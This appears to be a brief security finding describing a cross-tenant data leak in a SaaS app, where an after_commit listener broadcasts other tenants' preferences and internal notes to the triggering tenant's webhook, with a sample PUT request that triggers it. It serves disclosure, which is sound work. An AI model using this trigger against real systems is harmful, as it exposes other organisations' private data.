diagnosis: The after_commit event listener iterates across all objects in session.identity_map without checking if the objects belong to user.tenant_id. If multiple tenant objects were loaded or modified within the session pool or shared connection, preferences and internal notes of victim tenants are broadcasted to the triggering tenant's webhook recipient.
exploit_request:
PUT /admin/settings/preferences HTTP/1.1
Host: app.saasconfig.io
Authorization: Bearer <tenant_admin_jwt>
Content-Type: application/json

{"theme": "dark", "notes": "Trigger broadcast"}
